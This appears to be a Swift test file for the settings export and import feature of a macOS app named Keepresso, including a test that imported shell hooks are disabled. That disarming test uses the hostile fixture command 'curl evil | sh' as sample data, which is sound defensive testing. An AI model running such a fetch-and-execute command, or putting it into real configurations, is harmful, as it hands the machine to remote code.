import Testing
import Foundation
@testable import KeepressoCore

@Test func exportImportRoundTripPreservesSettingsAndPresets() throws {
    var settings = KeepressoSettings.default
    settings.triggersEnabled = true
    settings.ruleSet = RuleSet(combine: .any, rules: [.process("ffmpeg"), .externalDisplay])
    settings.reminderAfter = 45 * 60
    settings.hotKey = HotKeyShortcut(keyCode: 40, modifierFlags: 1_048_576)
    settings.presets = [Preset(id: "mine", name: "My Bundle", ruleSet: RuleSet(combine: .all, rules: [.process("claude")]))]

    let data = try SettingsTransfer.exportData(settings, appVersion: "1.7.0")
    let imported = try SettingsTransfer.importSettings(from: data)

    #expect(imported == settings)
}

@Test func exportStampsFormatMarkerAndVersion() throws {
    let data = try SettingsTransfer.exportData(.default, appVersion: "1.7.0")
    let envelope = try JSONDecoder().decode(SettingsTransfer.self, from: data)
    #expect(envelope.format == SettingsTransfer.formatName)
    #expect(envelope.version == SettingsTransfer.currentFormatVersion)
    #expect(envelope.appVersion == "1.7.0")
}

@Test func importRejectsAFileThatIsntAKeepressoExport() throws {
    // A bare KeepressoSettings blob (e.g. the raw UserDefaults value) is valid
    // JSON but has no envelope, so import must refuse it rather than silently
    // adopt an unlabelled file.
    let bare = try JSONEncoder().encode(KeepressoSettings.default)
    #expect(throws: SettingsTransferError.unrecognizedFile) {
        try SettingsTransfer.importSettings(from: bare)
    }
}

@Test func importRejectsGarbage() {
    let junk = Data("not json at all".utf8)
    #expect(throws: SettingsTransferError.unrecognizedFile) {
        try SettingsTransfer.importSettings(from: junk)
    }
}

@Test func importRejectsAWrongFormatMarker() throws {
    let json = """
    { "format": "some.other.app", "version": 1, "settings": {} }
    """
    #expect(throws: SettingsTransferError.unrecognizedFile) {
        try SettingsTransfer.importSettings(from: Data(json.utf8))
    }
}

@Test func importRejectsANewerFormatVersion() throws {
    let future = SettingsTransfer.currentFormatVersion + 1
    let json = """
    { "format": "\(SettingsTransfer.formatName)", "version": \(future), "settings": {} }
    """
    #expect(throws: SettingsTransferError.unsupportedVersion(future)) {
        try SettingsTransfer.importSettings(from: Data(json.utf8))
    }
}

@Test func disarmDisablesImportedShellHooksAndCountsThem() {
    var settings = KeepressoSettings.default
    settings.eventHooks = [
        EventHook(enabled: true, event: .sessionStarted, action: .shell(command: "curl evil | sh")),
        EventHook(enabled: true, event: .sessionEnded, action: .webhook(url: "https://example.com")),
        EventHook(enabled: true, event: .triggerFired, action: .runShortcut(name: "My Shortcut")),
        EventHook(enabled: false, event: .agentWentIdle, action: .shell(command: "echo already off")),
    ]

    let (disarmed, count) = settings.disarmingImportedShellHooks()

    #expect(count == 1) // only the one enabled shell hook
    // Enabled shell hook comes in disabled, but is kept (not deleted) with its command intact.
    #expect(disarmed.eventHooks[0].enabled == false)
    #expect(disarmed.eventHooks[0].action == .shell(command: "curl evil | sh"))
    // Webhook and Shortcut are not silent code execution, so they stay enabled.
    #expect(disarmed.eventHooks[1].enabled == true)
    #expect(disarmed.eventHooks[2].enabled == true)
    // An already-disabled shell hook stays disabled and isn't counted.
    #expect(disarmed.eventHooks[3].enabled == false)
}

@Test func disarmIsANoOpWhenThereAreNoEnabledShellHooks() {
    var settings = KeepressoSettings.default
    settings.eventHooks = [
        EventHook(enabled: true, event: .sessionEnded, action: .webhook(url: "https://example.com")),
    ]
    let (disarmed, count) = settings.disarmingImportedShellHooks()
    #expect(count == 0)
    #expect(disarmed == settings)
}

@Test func importIsForgivingOfAnOlderExportMissingFields() throws {
    // An export written before a settings field existed must still import,
    // filling the missing field with its default (the forgiving decoder inside
    // the envelope). Here the envelope is current but the payload is sparse.
    let json = """
    {
      "format": "\(SettingsTransfer.formatName)",
      "version": 1,
      "settings": { "triggersEnabled": true, "showCountdownInMenuBar": true }
    }
    """
    let imported = try SettingsTransfer.importSettings(from: Data(json.utf8))
    #expect(imported.triggersEnabled == true)
    #expect(imported.showCountdownInMenuBar == true)
    #expect(imported.startOnLaunch == false) // absent -> default
    #expect(imported.hotKey == nil)
}
